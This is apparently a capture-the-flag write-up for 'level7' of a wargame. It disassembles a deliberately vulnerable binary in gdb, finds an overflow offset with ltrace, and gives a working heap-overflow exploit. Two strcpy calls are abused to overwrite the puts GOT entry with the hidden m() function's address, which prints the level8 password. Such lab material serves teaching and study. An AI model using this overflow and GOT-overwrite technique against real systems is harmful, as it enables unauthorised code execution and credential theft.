# Level 7

```bash
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
```

## Testing the program

```bash
$ ./level7 
Segmentation fault (core dumped)

$ ./level7 hello
Segmentation fault (core dumped)

$ ./level7 hello you
~~

$ ./level7 hello to you
~~

$ ./level7 good day to you
~~
```

We have a program which takes at least two arguments and segfaults if otherwise.

## Learning more

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp
   0x08048527 <+6>:	sub    $0x20,%esp
   0x0804852a <+9>:	movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret    
End of assembler dump.
(gdb) 
```

Juste before the call to fopen we have this 

```bash 
(gdb) x/s 0x80486e9
0x80486e9:	 "r"
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
(gdb) 

```

Our observations : 
```plaintext
    • The program allocates twice with malloc for each argv[1] && argv[2].
    • It uses strcpy() twice to copy the arguments from the command line
    • There is an fopen("/home/user/level8/.pass", "r"), then read the file with fgets() into a global variable called c. 
    • Then it does a puts() with the '~~' but not the content of the file.
```


## Hidden M function

```bash
(gdb) info functions
[...]
0x080484f4  m
0x08048521  main
(gdb) 
```

We see that there is an uncalled m function. 

```bash
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret    
End of assembler dump.
(gdb) 
```

```bash
$ x/s 0x8049960
0x8049960 <c>:	 ""
```

The m function : 

```plaintext
    • Displays the current time with time()
    • Displays the content of the global variable c, which contains the content of the .pass file 
```


## Getting acces to the pass 

Our goal is going to be to call the m() function so that it displays the c global variable and therefore the .pass file. 

1. Using strcpy

The program calls strcpy() twice, once with the content of argv[1] and once with argv[2], since it doesn't check the size we are going to use that to redirect to the m() function.

2. GOT overwrite

Like in a previous level, we know that puts is called and is found thanks to the GOT. 

```bash
$ info function puts
0x08048400  puts@plt
(gdb) x/i 0x08048400
0x8048400 <puts@plt>:	jmp    *0x8049928
```

We want to replace the puts address which is 0x8049928 by m's address which is 0x080484f4. 

3. Finding the offset 

```bash
ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
__libc_start_main(0x8048521, 2, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                           = 0x0804a008
malloc(8)                                                                           = 0x0804a018
malloc(8)                                                                           = 0x0804a028
malloc(8)                                                                           = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                           = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Again using the pattern generator we found that this address, 0x37614136, corresponds to an offset of 20. 


4. Building the payload


```plaintext
    • 1st argument - Writes until reaching the GOT entry of puts
        • 20 chars ("a" * 20)
        • puts address in GOT -> 0x8049928 --> \x28\x99\x04\x08
    • 2nd agument - Overwrite puts address so that it points to m()
        • m()'s function address --> 0x080484f4 --> \xf4\x84\x04\x08
```


```bash
$ ./level7 $(python -c 'print "a"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1753975972
```